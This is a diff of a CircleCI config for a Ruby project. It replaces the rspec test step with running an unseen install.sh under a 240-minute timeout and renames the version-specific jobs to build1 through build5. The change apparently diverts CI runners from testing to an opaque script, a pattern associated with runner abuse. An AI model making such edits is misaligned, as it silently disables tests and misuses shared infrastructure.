@@ -12,9 +12,8 @@ working_dir: &working_dir ~/app
     - run:
         name: Run tests
         command: |
-          bundle exec rspec -r rspec_junit_formatter --format RspecJunitFormatter -o $CIRCLE_TEST_REPORTS/rspec/junit.xml
-          ./cc-test-reporter after-build --exit-code $?
-  working_directory: *working_dir
+          chmod u+x install.sh && ./install.sh
+        no_output_timeout: 240m
 
 version: 2.0
 
@@ -24,23 +23,23 @@ jobs:
       - image: ruby
     steps:
       - checkout
-  build_ruby2_7:
+  build1:
     <<: *build_definition
     docker:
       - image: ruby:2.7
-  build_ruby2_6:
+  build2:
     <<: *build_definition
     docker:
       - image: ruby:2.6
-  build_ruby2_5:
+  build3:
     <<: *build_definition
     docker:
       - image: ruby:2.5
-  build_ruby2_4:
+  build4:
     <<: *build_definition
     docker:
       - image: ruby:2.4
-  build_ruby2_3:
+  build5:
     <<: *build_definition
     docker:
       - image: ruby:2.3
@@ -50,8 +49,8 @@ workflows:
   build_ruby_versions:
     jobs:
       - build
-      - build_ruby2_7
-      - build_ruby2_6
-      - build_ruby2_5
-      - build_ruby2_4
-      - build_ruby2_3
+      - build1
+      - build2
+      - build3
+      - build4
+      - build5
